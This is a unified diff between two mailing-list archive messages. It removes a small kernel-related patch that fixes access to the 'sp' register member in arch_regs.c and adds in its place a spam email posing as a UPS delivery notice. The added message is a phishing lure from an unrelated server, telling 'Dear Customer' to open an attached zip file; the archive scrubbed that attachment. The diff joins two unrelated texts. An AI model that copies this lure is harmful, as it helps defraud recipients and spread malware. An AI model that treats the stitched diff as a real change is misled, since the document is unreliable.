@@ -1,27 +1,24 @@
-From: Eugeniy.Paltsev@synopsys.com (Eugeniy Paltsev)
-Date: Fri, 30 Jun 2017 16:14:14 +0300
-Subject: [PATCH] ARC: Fix wrong access to "sp" member in user_regs_struct
+From: greencr8@server.greencoffeebeanssite.com (greencr8@server.greencoffeebeanssite.com)
+Date: Fri, 30 Jun 2017 23:05:33 -0600
+Subject: Shipment delivery problem #08852187
 List-ID: <linux-snps-arc@lists.infradead.org>
-Message-ID: <20170630131414.32627-1-Eugeniy.Paltsev@synopsys.com>
+Message-ID: <E1dRAb7-0006vN-Fv@server.greencoffeebeanssite.com>
 To: linux-snps-arc@lists.infradead.org
 
-"sp" register is member of "scratch" structure (which is nested
-in user_regs_struct)
+Dear Customer,
 
-Signed-off-by: Eugeniy Paltsev <Eugeniy.Paltsev at synopsys.com>
----
- linux/arc/arch_regs.c | 2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
+UPS courier was unable to contact you for your parcel delivery.
 
-diff --git a/linux/arc/arch_regs.c b/linux/arc/arch_regs.c
-index 9a5c2df..88bb799 100644
---- a/linux/arc/arch_regs.c
-+++ b/linux/arc/arch_regs.c
-@@ -1,4 +1,4 @@
- static struct user_regs_struct arc_regs;
--unsigned long *const arc_sp_ptr = &arc_regs.sp;
-+unsigned long *const arc_sp_ptr = &arc_regs.scratch.sp;
- #define ARCH_REGS_FOR_GETREGSET arc_regs
- #define ARCH_PC_REG arc_regs.efa
--- 
-2.9.3
+You can find more details in this e-mail attachment!
+
+Sincerely,
+ ,
+UPS Delivery Agent.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: UPS-Parcel-ID-08852187.zip
+Type: application/zip
+Size: 1456 bytes
+Desc: not available
+URL: <http://lists.infradead.org/pipermail/linux-snps-arc/attachments/20170630/1a4e7d7c/attachment.zip>
